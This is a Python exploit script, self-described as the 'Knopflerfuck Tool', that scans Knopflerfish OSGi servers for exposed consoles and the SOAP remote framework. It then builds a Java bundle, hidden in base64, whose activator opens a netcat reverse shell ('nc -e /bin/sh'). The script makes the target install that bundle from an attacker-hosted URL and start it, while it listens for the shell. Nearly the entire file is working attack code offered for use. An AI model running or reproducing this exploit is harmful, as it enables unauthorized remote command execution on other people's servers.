#! /usr/bin/python3

import socket
import sys
import os
import time

def com(host,port,data):
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((host,int(port)))
 s.send(data)
 result = s.recv(10000)
 s.close()
 return result

def checkDefault(host,port):
 data = 'GET /servlet/knopflerfish-info HTTP/1.0\r\nHost: '+host+':'+port+'\r\n\r\n'
 ret = com(host,port,data)
 if(ret.find("200 OK") != -1):
  print("Default KF info page found: http://"+host+":"+port+"/servlet/knopflerfish-info")

def checkHTTPConsole(host,port):
 data = 'GET /servlet/console HTTP/1.0\r\nHost: '+host+':'+port+'\r\n\r\n'
 ret = com(host,port,data)
 if(ret.find("200 OK") != -1):
  print('HTTP Console found!!: http://'+host+':'+port+'/servlet/console')
  print('Run again with option 2 and build a payload to upload >:)')
  print('NOTE: HTTPConsole 4.0.1 has a known XSS. More info here:')
  print('- https://aahideaway.blogspot.com/2018/07/knopflerfish-bundle-httpconsole-401-xss.html')

def getRemoteInfo(host,port):
 body = '<v:Envelope xmlns:i="http://www.w3.org/1999/XMLSchema-instance" xmlns:d="http://www.w3.org/1999/XMLSchema" xmlns:c="http://schemas.xmlsoap.org/soap/encoding/" xmlns:v="http://www.w3.org/2001/12/soap-envelope"><v:Header /><v:Body><v:getSystemProperties/></v:Body></v:Envelope>'
 headers = 'POST /soap/services/OSGiFramework HTTP/1.0\r\nUser-Agent: kSOAP/2.0\r\nSOAPAction: getSystemProperties\r\nContent-Type: text/xml\r\nConnection: close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nHost: '+host+':'+port+'\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\nContent-Length: '+str(len(body))+'\r\n\r\n'
 data = headers+body
 #print("Request:\r\n"+data)
 ret = com(host,port,data)
 if(ret.find("200 OK") == -1):
  return
 print("Remote Framework exposed!!")
 print("Run with option 3 to upload a payload >:)")

def getInfo(host,port):
 checkDefault(host,port)
 checkHTTPConsole(host,port)
 getRemoteInfo(host,port)

def makePayload(host,port):
 print("Generating payload...")
 MF = "TWFuaWZlc3QtVmVyc2lvbjogMS4wCkJ1bmRsZS1OYW1lOiBTaGVsbApCdW5kbGUtQWN0aXZhdG9yOiBTaGVsbEFjdGl2YXRvcgpCdW5kbGUtU3ltYm9saWNOYW1lOiBTaGVsbApCdW5kbGUtVmVyc2lvbjogMS4wLjAKSW1wb3J0LVBhY2thZ2U6IG9yZy5vc2dpLmZyYW1ld29yawo="
 SJ = "aW1wb3J0IG9yZy5vc2dpLmZyYW1ld29yay4qOwppbXBvcnQgamF2YS51dGlsLio7CmltcG9ydCBqYXZhLmlvLio7CgpwdWJsaWMgY2xhc3MgU2hlbGxBY3RpdmF0b3IgaW1wbGVtZW50cyBCdW5kbGVBY3RpdmF0b3IgewogcHVibGljIHZvaWQgc3RhcnQoQnVuZGxlQ29udGV4dCBjb250ZXh0KSB7CiAgdHJ5ewogICBQcm9jZXNzIHAgPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJuYyAtZSAvYmluL3NoICRMSE9TVCAkTFBPUlQiKTsKICB9Y2F0Y2ggKElPRXhjZXB0aW9uIGUpIHsKICAgU3lzdGVtLm91dC5wcmludGxuKCIuLi4iKTsKICB9CiB9CiBwdWJsaWMgdm9pZCBzdG9wKEJ1bmRsZUNvbnRleHQgY29udGV4dCkgewogIFN5c3RlbS5vdXQucHJpbnRsbigia2J5ZSIpOwogfQp9Cg=="
 os.system("echo "+MF+"|base64 -d > Shell.mf")
 os.system("echo "+SJ+"|base64 -d > ShellActivator.java")
 os.system("sed -i -e 's/$LHOST/"+host+"/g' ShellActivator.java")
 os.system("sed -i -e 's/$LPORT/"+port+"/g' ShellActivator.java")
 os.system("javac -classpath eceq.jar ShellActivator.java")
 os.system("jar -cfm Shell.jar Shell.mf ShellActivator.class")
 os.system("rm Shell.mf ShellActivator.*")
 print("Done. Shell.jar is ready to be uploaded...")

def parseLastItem(data):
 p = data.split("<item i:type=\"d:long\">")
 p2 = p[-1].split("</item>")
 return p2[0]

def upload(rhost,rport,srvhost,srvport,lport):
 print("Attempting to upload payload via KF Remote Framework...")
 print("Opening xterm to catch the shell...")
 os.system("xterm -e nc -l -p "+lport+" &")
 time.sleep(5)
 print("Getting list of installed bundles...")
 bunReqData = "POST /soap/services/OSGiFramework HTTP/1.1\r\nUser-Agent: kSOAP/2.0\r\nSOAPAction: getBundles\r\nContent-Type: text/xml\r\nConnection: close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nHost: "+rhost+":"+rport+"\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\nContent-Length: 286\r\n\r\n<v:Envelope xmlns:i=\"http://www.w3.org/1999/XMLSchema-instance\" xmlns:d=\"http://www.w3.org/1999/XMLSchema\" xmlns:c=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:v=\"http://www.w3.org/2001/12/soap-envelope\"><v:Header /><v:Body><v:getBundles id=\"o0\" c:root=\"1\" /></v:Body></v:Envelope>"
 bunRes = com(rhost,rport,bunReqData)
 bunCount = parseLastItem(bunRes)
 print("Got last bundle ID...")
 print("Sending install request...")
 installReqDataBody = "<v:Envelope xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:d=\"http://www.w3.org/2001/XMLSchema\" xmlns:c=\"http://www.w3.org/2001/12/soap-encoding\" xmlns:v=\"http://www.w3.org/2001/12/soap-envelope\"><v:Header /><v:Body><v:installBundle id=\"o0\" c:root=\"1\"><location>http://"+srvhost+":"+srvport+"/Shell.jar</location></v:installBundle></v:Body></v:Envelope>"
 installReqDataHeaders = "POST /soap/services/OSGiFramework HTTP/1.1\r\nUser-Agent: kSOAP/2.0\r\nSOAPAction: installBundle\r\nContent-Type: text/xml\r\nConnection: close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nHost: "+rhost+":"+rport+"\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\nContent-Length: "+str(len(installReqDataBody))+"\r\n\r\n"
 installReq = installReqDataHeaders+installReqDataBody
 installRes = com(rhost,rport,installReq)
 if(installRes.find("200 OK") != -1):
  print("Payload installed!!")
 else:
  print("Something did not go right...")
  return
 print("Getting payload bundle ID...")
 newBun = com(rhost,rport,bunReqData)
 newBunId = parseLastItem(newBun)
 print("Starting shell...")
 startBunBody = "POST /soap/services/OSGiFramework HTTP/1.1\r\nUser-Agent: kSOAP/2.0\r\nSOAPAction: startBundle\r\nContent-Type: text/xml\r\nConnection: close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nHost: "+rhost+":"+rport+"\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\nContent-Length: 316\r\n\r\n<v:Envelope xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:d=\"http://www.w3.org/2001/XMLSchema\" xmlns:c=\"http://www.w3.org/2001/12/soap-encoding\" xmlns:v=\"http://www.w3.org/2001/12/soap-envelope\"><v:Header /><v:Body><v:startBundle id=\"o0\" c:root=\"1\"><v:bid>"+newBunId+"</v:bid></v:startBundle></v:Body></v:Envelope>"
 startRes = com(rhost,rport,startBunBody)
 if(startRes.find("200 OK") != -1):
  print("Shell started >:)")

def use():
 print("KFT has 3 modes")
 print("Mode 1 runs an enum scan")
 print("-Checks for default bundle info, HTTPConsole, and if the remote framework is running")
 print("-Usage: python knopflerfucktool.py 1 <rhost> <rport>")
 print("Mode 2 outputs a payload to upload however you like")
 print("-Usage: python knopflerfucktool.py 2 <lhost> <lport>")
 print("-This mode also makes the payload needed for mode 3")
 print("-Requires openJDK 1.8.0 and Eclipse Equinox (eceq.jar)");
 print("Mode 3 uses the KF Remote Framework to upload and run a payload")
 print("-Usage: python knopflerfucktool.py 3 <rhost> <rport> <srvhost> <srvport> <lport>")
 print("-This mode needs the payload from mode 2")
 print("-The payload needs to be host on the web root of http://<srvhost>:<srvport>/")

def main():
  print("+----------")
  print("| Knopflerfuck Tool v1.0")
  print("| By Adam Espitia")
  print("| @anarchyang31")
  print("+----------\r\n")
  try:
   mode = sys.argv[1]
  except:
   use()
   return
  if (int(mode) == 1):
   print("Running enum...")
   host = sys.argv[2]
   port = sys.argv[3]
   getInfo(host,port)
  elif (int(mode) == 2):
   makePayload(sys.argv[2],sys.argv[3])
  elif (int(mode) == 3):
   upload(sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5],sys.argv[6])
  else:
   use()

main()
